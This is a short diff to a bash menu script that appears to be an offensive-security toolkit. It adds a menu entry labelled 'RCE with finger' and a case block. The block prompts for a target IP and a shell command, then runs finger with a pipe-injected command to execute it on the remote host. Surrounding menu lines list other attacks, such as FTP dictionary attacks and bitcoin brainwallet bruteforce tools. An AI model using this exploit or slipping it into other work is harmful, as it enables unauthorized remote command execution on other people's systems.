@@ -588,7 +588,7 @@ while true; do
 	echo -ne " 739. install tor from torproject siteweb\t740. install tor via apt-transport-tor\n"
 	echo -ne " 744. get mx record from domain with dig\t745. get dns infos with host\t\t\t\t\t746. get ntp infos with ntpq\n"
 	echo -ne " 747. get netbios infos with nmblookup\t749. download all files from IP in ftp with anonymous creds\n"
-	echo -ne " 750. username and password dictionary attack with wget and ftp protocol\n"
+	echo -ne " 750. username and password dictionary attack with wget and ftp protocol\t\t751. RCE with finger\n"
 	echo "$SEP"
 	echo "VIRTUAL COINS - CURRENCIES"
 	echo -ne " 511. Isaacdelly/Plutus\t\t\t\t512. dan-v/bruteforce-bitcoin-brainwallet\t\t513. SMH17/bitcoin-hacking-tools\n"
@@ -3961,6 +3961,19 @@ while true; do
 						done
 					done
 				fi
+			fi
+		fi
+	;;
+	"751")
+		echo "Digit a target IP or domain"
+		read -p "(example, 10.11.12.13 or domain.com): " IP
+		if [[ "$IP" != "" ]];
+		then
+			echo "Digit a command to execute"
+			read -p "(example, /bin/id): " CMD
+			if [[ "$CMD" != "" ]];
+			then
+				finger "|$CMD@$IP"
 			fi
 		fi
 	;;
